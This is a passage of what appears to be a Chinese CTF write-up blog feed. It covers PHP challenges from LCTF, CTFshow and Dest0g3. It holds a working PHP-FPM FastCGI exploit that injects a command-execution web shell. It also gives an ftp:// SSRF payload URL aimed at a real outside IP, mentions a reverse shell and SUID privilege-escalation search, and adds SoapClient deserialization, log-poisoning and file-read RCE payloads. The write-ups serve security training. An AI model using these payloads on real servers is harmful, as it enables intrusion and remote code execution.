punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unexpected response type, expecting GET_VALUES_RESULT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Execute a request to the FastCGI application     *     * @param array $params Array of parameters     * @param String $stdin Content     * @return String     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">request</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token comment">//        $this->connect();</span>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BEGIN_REQUEST</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">RESPONDER</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$paramsRequest</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$params</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$paramsRequest</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$paramsRequest</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token variable">$paramsRequest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stdin</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?file=ftp://ip:9999/&amp;data='</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        fwrite($this->_sock, $request);</span><span class="token comment">//        do &#123;</span><span class="token comment">//            $resp = $this->readPacket();</span><span class="token comment">//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) &#123;</span><span class="token comment">//                $response .= $resp['content'];</span><span class="token comment">//            &#125;</span><span class="token comment">//        &#125; while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);</span><span class="token comment">//        var_dump($resp);</span><span class="token comment">//        if (!is_array($resp)) &#123;</span><span class="token comment">//            throw new Exception('Bad request');</span><span class="token comment">//        &#125;</span><span class="token comment">//        switch (ord($resp['content']&#123;4&#125;)) &#123;</span><span class="token comment">//            case self::CANT_MPX_CONN:</span><span class="token comment">//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::OVERLOADED:</span><span class="token comment">//                throw new Exception('New request rejected; too busy [OVERLOADED]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::UNKNOWN_ROLE:</span><span class="token comment">//                throw new Exception('Role value not known [UNKNOWN_ROLE]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::REQUEST_COMPLETE:</span><span class="token comment">//                return $response;</span><span class="token comment">//        &#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// real exploit start here</span><span class="token comment">//if (!isset($_REQUEST['cmd'])) &#123;</span><span class="token comment">//    die("Check your input\n");</span><span class="token comment">//&#125;</span><span class="token comment">//if (!isset($_REQUEST['filepath'])) &#123;</span><span class="token comment">//    $filepath = __FILE__;</span><span class="token comment">//&#125;else&#123;</span><span class="token comment">//    $filepath = $_REQUEST['filepath'];</span><span class="token comment">//&#125;</span><span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/add_api.php"</span><span class="token punctuation">;</span><span class="token variable">$req</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token variable">$req</span> <span class="token operator">.</span><span class="token string single-quoted-string">'?'</span><span class="token operator">.</span><span class="token string single-quoted-string">'command=whoami'</span><span class="token punctuation">;</span><span class="token variable">$client</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FCGIClient</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"unix:///var/run/php-fpm.sock"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php system(\$_REQUEST['command']); phpinfo(); ?>"</span><span class="token punctuation">;</span> <span class="token variable">$php_value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"unserialize_callback_func = system\nextension_dir = /var/www/html\nextension = 1.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = "</span><span class="token punctuation">;</span>   <span class="token comment">//注意修改这里的so文件名称和路径</span><span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string single-quoted-string">'GATEWAY_INTERFACE'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'FastCGI/1.0'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'REQUEST_METHOD'</span>    <span class="token operator">=></span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SCRIPT_FILENAME'</span>   <span class="token operator">=></span> <span class="token variable">$filepath</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SCRIPT_NAME'</span>       <span class="token operator">=></span> <span class="token variable">$req</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'QUERY_STRING'</span>      <span class="token operator">=></span> <span class="token string single-quoted-string">'command=whoami'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'REQUEST_URI'</span>       <span class="token operator">=></span> <span class="token variable">$uri</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'DOCUMENT_URI'</span>      <span class="token operator">=></span> <span class="token variable">$req</span><span class="token punctuation">,</span><span class="token comment">#'DOCUMENT_ROOT'     => '/',</span>    <span class="token string single-quoted-string">'PHP_VALUE'</span>         <span class="token operator">=></span> <span class="token variable">$php_value</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SERVER_SOFTWARE'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'80sec/wofeiwo'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'REMOTE_ADDR'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'REMOTE_PORT'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'9001'</span><span class="token punctuation">,</span>    <span class="token comment">// 注意这里的FPM端口</span>    <span class="token string single-quoted-string">'SERVER_ADDR'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SERVER_PORT'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'80'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SERVER_NAME'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SERVER_PROTOCOL'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'HTTP/1.1'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'CONTENT_LENGTH'</span>    <span class="token operator">=></span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// print_r($_REQUEST);</span><span class="token comment">// print_r($params);</span><span class="token comment">//echo "Call: $uri\n\n";</span><span class="token keyword">echo</span> <span class="token variable">$client</span><span class="token operator">-></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成payload后访问</p><pre class="line-numbers language-none"><code class="language-none">hack.php?file&#x3D;ftp:&#x2F;&#x2F;45.15.131.101:9999&#x2F;&amp;data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反弹shell成功，提权，查看有suid的命令</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null/bin/mount/bin/su/bin/umount/usr/bin/chfn/usr/bin/chsh/usr/bin/gpasswd/usr/bin/newgrp/usr/bin/passwd/usr/local/bin/php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用php命令行模式，同样先绕过open_basedir，再readfile读取flag即可</p>        <h2 id="bestphp’s-revenge"   >          <a href="#bestphp’s-revenge" class="heading-link"><i class="fas fa-link"></i></a><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h2>      <p>上来就是一个源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'implode'</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'welcome_to_the_lctf2018'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//此处如果不更改$b那么就会直接将$a合并为字符串然后返回</span><span class="token delimiter important">?></span></span>//还有一个flag.phpsession_start();echo 'only localhost can get flag!';$flag = 'LCTF&#123;*************************&#125;';if($_SERVER["REMOTE_ADDR"]==="127.0.0.1")&#123;       $_SESSION['flag'] = $flag;   &#125;only localhost can get flag!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>明显是SSRF了，<a href="https://jlan.darkflow.top/posts/210d3ac7.html#HFCTF2020-BabyUpload">[HFCTF2020]BabyUpload</a>这里有php的session存储引擎相关内容，php中默认使用的是PHP引擎，修改引擎使用<code>ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;);</code>即可修改，此处我们通过不同的session存储读取方法即可导致反序列化，而SSRF只需要通过原生类中的<code>SoapClient</code>类反序列化执行<code>__call</code>方法就行</p><p>首先构造<code>SoapClient</code>类</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"http://127.0.0.1/flag.php"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uri'</span> <span class="token operator">=></span> <span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'location'</span> <span class="token operator">=></span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"|"</span> <span class="token operator">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后上传，使得反序列化被执行</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?f&#x3D;session_start&amp;name&#x3D;|O%3A10%3A%22SoapClient%22%3A3%3A%7Bs%3A3%3A%22uri%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7Dserialize_handler&#x3D;php_serialize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>调用类中不存在的方法触发<code>__call</code></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?f&#x3D;extract&amp;name&#x3D;SoapClientb&#x3D;call_user_func<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>var_dump查看SESSIONID，最终改Cookie拿flag</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow黑盒测试</title>
      <link href="/posts/c8094d2d.html"/>
      <url>/posts/c8094d2d.html</url>
      
        <content type="html"><![CDATA[<p><strong>380</strong></p><p>扫目录扫除page.php文件</p><p>打开提示文件不存在，传参包含flag.php</p><p><strong>381</strong></p><pre class="line-numbers language-none"><code class="language-none">打开page_$id.php失败<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这次变了，目录穿越能拿到源码，但没有什么用，回首页发现css文件路径很奇怪，访问得到flag</p><p><strong>382</strong></p><p>同上题目录，不过需要登录，万能密码即可</p><p><strong>383</strong></p><p>同上</p><p><strong>384</strong></p><p>提示：<code>密码前2位是小写字母，后三位是数字</code></p><p>爆破咯，结果是xy123</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Dest0g3 520迎新赛</title>
      <link href="/posts/41a3f068.html"/>
      <url>/posts/41a3f068.html</url>
      
        <content type="html"><![CDATA[        <h2 id="phpdest"   >          <a href="#phpdest" class="heading-link"><i class="fas fa-link"></i></a><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h2>      <p>包含log文件改User-Agent</p><pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.logUser-Agent: &lt;?php var_dump($flag);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011423203.png"></p>        <h2 id="EasyPHP"   >          <a href="#EasyPHP" class="heading-link"><i class="fas fa-link"></i></a><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2>      <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"fl4g.php"</span><span class="token punctuation">;</span><span class="token variable">$dest0g3</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"H"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$timme</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$timmme</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$time</span> <span class="token operator">></span> <span class="token string double-quoted-string">"24"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token variable">$timme</span> <span class="token operator">></span> <span class="token string double-quoted-string">"31"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token variable">$timmme</span> <span class="token operator">></span> <span class="token string double-quoted-string">"60"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$fl4g</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try harder!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">set_error_handler</span><span class="token punctuation">(</span>    <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$fl4g</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">print</span> <span class="token variable">$fl4g</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$fl4g</span> <span class="token operator">.=</span> <span class="token variable">$dest0g3</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>time条件是不可能满足了，看下面的自定义错误函数，只需要让程序产生错误就行，.运算用于拼接字符串，传入数组即可</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTctf[]&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011423502.png"></p>        <h2 id="SimpleRCE"   >          <a href="#SimpleRCE" class="heading-link"><i class="fas fa-link"></i></a><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h2>      <p>glob协议得到文件名，再使用fopen打开文件，fread读取内容</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTaaa&#x3D;echo(fread(fopen(end(glob(&#39;&#x2F;f*&#39;)),&#39;r&#39;),100));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011423683.png"></p>        <h2 id="EasySSTI"   >          <a href="#EasySSTI" class="heading-link"><i class="fas fa-link"></i></a><a href="#EasySSTI" class="headerlink" title="EasySSTI"></a>EasySSTI</h2>      <p>先给个一次性payload</p><pre class="line-numbers language-none"><code 